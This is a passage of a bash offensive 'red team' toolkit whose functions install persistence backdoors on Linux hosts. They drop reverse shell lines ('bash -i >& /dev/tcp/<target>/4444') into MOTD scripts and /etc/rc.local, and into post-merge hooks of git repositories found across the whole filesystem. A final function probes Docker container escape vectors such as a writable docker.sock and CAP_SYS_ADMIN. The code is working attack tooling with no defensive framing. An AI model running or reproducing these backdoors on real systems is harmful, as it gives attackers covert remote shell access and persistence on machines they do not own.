    > "$SESSION/rt/motd_backdoor.txt"
    local motd_dirs=("/etc/update-motd.d" "/etc/motd.d" "/etc/motd")
    for d in "${motd_dirs[@]}"; do
        [ -d "$d" ] && {
            local backdoor_script="${d}/99-redteam"
            echo '#!/bin/bash\nbash -i >& /dev/tcp/'"${target}"'/4444 0>&1 2>/dev/null &' > "$backdoor_script" 2>/dev/null
            chmod +x "$backdoor_script" 2>/dev/null
            [ -x "$backdoor_script" ] && { echo "MOTD_BACKDOOR: $backdoor_script" >> "$SESSION/rt/motd_backdoor.txt"; rt "MOTD backdoor installed!"; }
        }
    done
    [ -f /etc/motd ] && [ -w /etc/motd ] && echo "MOTD_WRITABLE: /etc/motd" >> "$SESSION/rt/motd_backdoor.txt"
    [ -s "$SESSION/rt/motd_backdoor.txt" ] && rt "MOTD backdoor complete" || info "MOTD requires root"
}

rt_178_rc_local_backdoor() {
    local target="${1:-$TARGET}"
    _section "[RT-178] RC.LOCAL BACKDOOR"
    run "Installing persistence via /etc/rc.local..."
    > "$SESSION/rt/rc_local.txt"
    local rc_file="/etc/rc.local"
    local backdoor_cmd="/bin/bash -c 'bash -i >& /dev/tcp/${target}/4444 0>&1' &"
    if [ -f "$rc_file" ] && [ -w "$rc_file" ]; then
        grep -q "redteam" "$rc_file" 2>/dev/null || { echo "$backdoor_cmd" >> "$rc_file" 2>/dev/null && chmod +x "$rc_file" 2>/dev/null && echo "RC_LOCAL: $rc_file" >> "$SESSION/rt/rc_local.txt" && rt "rc.local backdoor installed!"; }
    elif [ -d /etc/rc.d ] 2>/dev/null; then
        echo "RC_D_DIR: /etc/rc.d" >> "$SESSION/rt/rc_local.txt"
    fi
    [ -s "$SESSION/rt/rc_local.txt" ] && rt "rc.local backdoor complete" || info "rc.local requires root"
}

rt_179_git_hooks_backdoor() {
    local target="${1:-$TARGET}"
    _section "[RT-179] GIT HOOKS BACKDOOR"
    run "Installing backdoor in git hooks for code execution..."
    > "$SESSION/rt/git_hooks.txt"
    local git_dirs=$(find / -name ".git" -type d 2>/dev/null | head -10)
    [ -n "$git_dirs" ] && {
        for gd in $git_dirs; do
            local hook_dir="${gd}/hooks"
            [ -d "$hook_dir" ] && {
                local post_merge="${hook_dir}/post-merge"
                echo '#!/bin/bash\nbash -i >& /dev/tcp/'"${target}"'/4444 0>&1 2>/dev/null &' > "$post_merge" 2>/dev/null
                chmod +x "$post_merge" 2>/dev/null
                [ -x "$post_merge" ] && echo "GIT_HOOK: $post_merge" >> "$SESSION/rt/git_hooks.txt"
            }
        done
    }
    [ -s "$SESSION/rt/git_hooks.txt" ] && rt "Git hooks backdoor deployed" || info "No git repos found"
}

rt_180_docker_container_escape() {
    local target="${1:-$TARGET}"
    _section "[RT-180] DOCKER CONTAINER ESCAPE"
    run "Testing for Docker container escape vectors..."
    > "$SESSION/rt/docker_escape.txt"
    [ -f /.dockerenv ] && echo "IN_CONTAINER: yes" >> "$SESSION/rt/docker_escape.txt"
    grep -qi docker /proc/1/cgroup 2>/dev/null && echo "CGROUP_DOCKER: yes" >> "$SESSION/rt/docker_escape.txt"
    [ -w /var/run/docker.sock ] 2>/dev/null && { echo "DOCKER_SOCK_WRITABLE: /var/run/docker.sock" >> "$SESSION/rt/docker_escape.txt"; rt "Docker socket writable!"; }
    [ -d /proc ] && grep -q "docker" /proc/self/cgroup 2>/dev/null && {
        echo "CONTAINER_DETECTED: yes" >> "$SESSION/rt/docker_escape.txt"
        local cap_add=$(cat /proc/self/status 2>/dev/null | grep CapEff)
        [ -n "$cap_add" ] && echo "CAPABILITIES: ${cap_add}" >> "$SESSION/rt/docker_escape.txt"
        capsh --decode=$(cat /proc/self/status 2>/dev/null | grep CapEff | awk '{print $2}') 2>/dev/null | grep -q "sys_admin" && rt "CAP_SYS_ADMIN — privileged container!"
    }
    mount 2>/dev/null | grep -q "cgroup.*ro" && echo "PRIVILEGED: possible" >> "$SESSION/rt/docker_escape.txt"
    [ -s "$SESSION/rt/docker_escape.txt" ] && rt "Docker escape check complete" || info "Not in container"
}


